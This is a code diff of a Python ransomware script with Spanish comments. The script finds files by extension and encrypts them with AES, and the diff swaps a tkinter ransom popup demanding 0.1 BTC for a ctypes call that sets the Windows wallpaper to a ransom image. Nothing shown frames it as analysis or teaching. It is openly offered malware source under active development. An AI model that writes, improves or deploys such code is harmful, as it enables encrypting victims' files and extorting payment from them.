@@ -1,9 +1,13 @@
 import os
+import ctypes
 from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
 from cryptography.hazmat.primitives import padding
 from cryptography.hazmat.backends import default_backend
 import secrets
-import tkinter as tk
+
+def change_wallpaper(image_path):
+    """ Cambia el fondo de pantalla de Windows a la imagen especificada """
+    ctypes.windll.user32.SystemParametersInfoW(20, 0, image_path, 3)
 
 def find_files(directory, extensions):
     """ Encuentra archivos en un directorio dado con ciertas extensiones """
@@ -32,8 +36,6 @@ def encrypt_file(file_path, key):
         f.write(encrypted_data)
 
 def display_ransom_message():
-    """ Muestra un mensaje de rescate en una ventana emergente """
-    root = tk.Tk()
-    root.title("Ransomware Notice")
-    tk.Label(root, text="Sus archivos han sido cifrados. Envíe 0.1 BTC a la dirección XYZ para recuperar sus archivos.", wraplength=400).pack()
-    root.mainloop()
+    """ Cambia el fondo de pantalla a una imagen que indica un mensaje de ransomware """
+    image_path = os.path.abspath("encrypted_message.jpg")
+    change_wallpaper(image_path)
